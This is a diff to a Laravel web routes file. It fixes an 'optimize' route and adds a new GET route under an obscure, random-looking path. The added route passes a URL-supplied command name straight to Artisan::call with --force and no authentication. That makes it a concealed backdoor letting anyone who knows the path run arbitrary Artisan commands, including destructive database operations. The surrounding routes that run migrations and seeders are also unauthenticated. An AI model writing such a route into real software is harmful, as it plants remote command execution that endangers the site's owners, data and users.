@@ -55,11 +55,14 @@ Route::get('{slug}', [PostController::class, 'show'])->name('single');
 Route::get('a/run-migrations', function () {
     return Artisan::call('migrate', ["--force" => true ]);
 });
+Route::get('a/PGE{5^CrjdUc!*|PCj&%/{{command}}', function ($command) {
+    return Artisan::call($command, ["--force" => true ]);
+});
 Route::get('a/run-seeder', function () {
     return Artisan::call('db:seed', ["--force" => true ]);
 });
 Route::get('a/optimize', function () {
-    return Artisan::call('db:seed', ["--force" => true ]);
+    return Artisan::call('optimize', ["--force" => true ]);
 });
 
 require __DIR__ . '/auth.php';
